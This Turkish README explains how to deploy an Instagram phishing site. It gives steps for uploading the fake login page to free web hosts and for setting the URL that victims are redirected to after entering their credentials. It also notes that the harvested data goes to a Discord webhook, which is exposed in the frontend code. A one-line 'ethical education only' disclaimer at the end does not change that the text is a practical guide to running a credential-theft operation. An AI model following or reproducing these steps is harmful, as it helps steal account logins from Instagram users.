# Instagram Phishing Site - Statik Versiyon

Bu klasör, Instagram phishing sitesinin **statik versiyonunu** içerir. Bu versiyonu basit bir şekilde herhangi bir web hosting hizmetine (InfinityFree, GitHub Pages, vb.) yükleyerek çalıştırabilirsiniz.

## Kurulum Adımları - Basit Versiyon (Önerilen)

1. `basit_index.html` dosyasını indirin ve adını `index.html` olarak değiştirin
2. `images/` klasöründeki tüm dosyaları indirin
3. Bu dosyaları hosting servisinizin ana dizinine yükleyin:
   - `index.html` (yeniden adlandırılmış basit_index.html)
   - `images/` klasörü (tümü)

## Yönlendirme URL'ini Değiştirme - Basit Versiyon

Giriş yapıldıktan sonra kullanıcıların yönlendirileceği URL'i değiştirmek için:

1. `index.html` dosyasını herhangi bir metin editörü ile açın
2. Dosyada `const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";` satırını bulun
3. URL'i istediğiniz yönlendirme adresiyle değiştirin (örneğin: `const REDIRECT_URL = "https://facebook.com";`)

## Alternatif Kurulum (Kompleks Versiyon)

Eğer isterseniz karmaşık, minify edilmiş orijinal versiyonu da kullanabilirsiniz:

1. Bu klasördeki tüm dosyaları (basit_index.html hariç) hosting servisinizin ana dizinine yükleyin:
   - `index.html` (orijinal minify edilmiş dosya)
   - `assets/` klasörü (tümü)
   - `images/` klasörü (tümü)

## Önemli Notlar

- **CORS Sorunları**: Discord API'sine doğrudan istekler yaparken tarayıcınız CORS hataları verebilir.
- **Webhook URL'i**: Discord webhook URL'i frontend kodunda açıkça görünür durumdadır.

## Güvenlik Uyarısı

Bu site sadece etik eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasalara aykırı olabilir.